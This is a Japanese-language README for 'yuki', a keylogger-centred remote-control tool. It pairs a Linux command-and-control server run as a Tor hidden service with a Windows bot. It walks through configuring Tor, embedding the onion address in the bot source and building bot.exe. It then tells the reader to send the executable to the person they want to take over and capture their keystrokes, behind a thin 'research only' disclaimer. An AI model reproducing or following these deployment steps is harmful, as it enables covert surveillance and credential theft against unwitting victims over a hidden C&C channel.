# yuki
keylogger搭載してるというか、それに特化したハッキングツール。<br>

ちなみに、カレントディレクトリの表示は動作確認用

## 動作環境
### C&C
* Linux (Debian)
### Bot
* Windows 10

## 注意
<b>研究目的での使用以外での使用をおやめください。</b> <br>
研究目的以外で使用した場合責任を負いません。自己責任。<br><br>
使用するとき、仮想マシンが必須になるかもしれません。<br>
あと、多少のバグは許して...

## コンパイル
WindowsとLinuxと同時に使って環境構築をしていきます。<br>
まずは、Linuxから設定をしていきます。<br>

Torをインストール
```
$ sudo apt install tor
```
インストールが終わったらtorrcを編集します。
```
$ sudo vi /etc/tor/torrc
```
ソースコードの関係上以下の通りに書き換えてください。
```
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
```
ここでほぼほぼLinuxでの設定は完了します。<br>
では、以下のコマンドを実行しちゃって終わらせちゃいましょう。
```
$ bash build.sh
```
ちなみに、onionサイトのドメイン名を確認するには
```
$ sudo cat /var/lib/tor/hidden_service/hostname
```

<br>
次は、Windowsにうつって環境構築していきます。<br>
ぶっちゃけて言うとクロスコンパイラ使えば問題ないと思いますが、めいんどいので今回は解説しません。<br>

まず、botというディレクトリのなかのmain.cppを開きます。<br>

そしたら、xxxxxxxxxxxxxxxxxxxxxxxxxxx.onionをcncサーバのドメイン名に書き換えてください。
```c
#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
```
終わったらbuild.batを実行してコンパイル終了です。

## 使い方
必ず最初にLinuxでcnc.outを実行してください。
```
$ ./cnc.out
```
そしたら、コンパイルしたbot.exeを乗っ取りたい相手に送ってください。<br>
<br>
乗っ取りに成功しましたら`help`をつかってどのコマンドが使えるか確認することができます。
```
root@cnc:~$ help
Command List
       pwd       - view current directory
       keylogger - get the characters you entered
```
keyloggerとコマンドを使った場合、Ctrl+Cで閉じないと終わる方法がありませんので注意。<br>
(あとで、C&Cサーバの起動に時間がかかることには目を瞑って...)

## 参考資料
[RAT](https://github.com/ware255/RAT) <br>
[ Working with Tor (C/C++) ](https://gist.github.com/anhldbk/f62fbe5e5a0e48740c6959e3e0907c81) <br>
[ Simple keylogger in C++ ](https://gist.github.com/cdohara/99f3ac257b6f98d723818aedd1c39a4e)
